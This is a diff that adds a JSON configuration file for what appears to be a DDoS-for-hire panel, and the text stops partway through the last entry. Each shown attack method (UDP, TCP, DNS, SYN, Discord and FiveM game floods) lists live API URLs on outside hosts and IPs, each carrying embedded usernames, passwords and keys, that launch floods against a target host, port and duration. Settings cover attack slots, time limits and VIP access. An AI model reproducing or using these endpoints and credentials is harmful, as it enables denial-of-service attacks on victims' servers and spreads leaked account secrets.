@@ -1,0 +1,1983 @@
+{
+    "attacks": [
+        {
+            "method_name": "GUDP",
+            "links": [
+                "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=mixamp",
+                "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=udpbypass",
+                "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=udp",
+                "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=UDPPPS",
+                "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp",
+                "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=udpdoom",
+                "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=udp&pps=-1&threads=10",
+                "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=udp",
+                "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=udp",
+                "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=udptop",
+                "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=UDP-PPS",
+                "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=udp-destroy",
+                "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp"
+                
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "Socket",
+            "links": [
+       "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=socket",
+       "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tcplegit",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcpbypass",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=tcpmix",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=tcpkill",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=udp",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=UDPPPS",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=tcpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=stomp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=fastsock",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=tcprape",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=TCP-AMP"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        
+        {
+            "method_name": "DISCORD",
+            "links": [
+        "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=discord",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=discord",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=discord",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=discord"
+
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "fivem",
+            "links": [
+        "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=fivem",
+       "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tcplegit",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=fivem",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=tcpmix",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=fivem",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=udp",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=TCPBOOM",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=tcpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=stomp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=fivem",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=tcprape",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=TCP-AMP"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "game",
+            "links": [
+     "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=game",
+     "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=game",
+     "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=game",
+     "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=game",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=game",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=game",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=game"
+
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "subnet",
+            "links": [
+         "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=subnet",
+         "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=subnet"
+
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "DNS",
+            "links": [
+       "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=dns",
+       "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=udp",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=dns",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=dns",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=dns",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=dns",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=dns",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=dns",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=dns",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=dns&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=dns",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=gudp",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=dns",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=dns"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "syn-null",
+            "links": [
+        "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=syn",
+       "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=syn",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcpbypass",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=tcpmix",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=tcpboom",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=udp",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=TCPBOOM",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=tcpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=stomp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=synkill",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=tcprape",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=TCP-AMP"    
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 60,
+                        "enabled": true
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "test",
+            "links": [
+            "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=udpbypass&pps=-1&threads=10",
+            "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=HTTP-ULTRA"
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "handshake",
+            "links": [
+     "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=tcpdrop",
+      "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=handshake",
+      "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcpbypass",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=handshake",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=tcpkill",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=tcp-rand",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=TCPBOOM",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=tcpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=stomp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tcp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=synkill",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=tcprape",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=HANDSHAKE"
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
